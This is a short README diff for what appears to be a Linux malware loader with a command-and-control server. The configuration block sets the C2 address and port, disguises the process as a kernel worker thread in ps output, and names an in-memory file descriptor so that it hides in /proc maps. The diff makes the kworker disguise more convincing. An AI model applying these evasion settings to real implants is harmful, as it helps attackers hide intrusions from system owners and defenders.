@@ -20,7 +20,7 @@ Inside `loader.c`, you can configure the following parameters:
 ```c
 const char *C2_IP        = "127.0.0.1";       // C2 IP
 const int   C2_PORT      = 1111;              // C2 port
-const char *FAKE_PROC    = "[kworker/u!0]";   // Shown in `ps` output
+const char *FAKE_PROC    = "[kworker/0:1-events]";   // Shown in `ps` output
 const char *FD_NAME      = "error";          // Shown in `cat /proc/<pid>/maps` as [memfd:error (deleted)]
 ````
 
